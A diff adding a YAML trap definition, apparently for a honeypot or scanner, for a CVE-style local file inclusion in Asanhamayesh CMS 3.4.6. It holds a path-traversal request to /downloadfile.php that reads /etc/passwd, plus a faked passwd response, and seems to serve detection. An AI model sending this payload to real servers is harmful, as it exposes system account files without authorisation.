@@ -1,0 +1,26 @@
+id: asanhamayesh-lfi
+info:
+  name: Asanhamayesh CMS 3.4.6 - Local File Inclusion
+  author: 0x_Akoko
+  description: Asanhamayesh CMS 3.4.6 is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://cxsecurity.com/issue/WLB-2018030006
+  - https://asanhamayesh.com
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: asanhamayesh,lfi,traversal
+traps:
+- request:
+    method: GET
+    path: /downloadfile.php?file=../../../../../../../../../../etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: root:[x*]:0:0
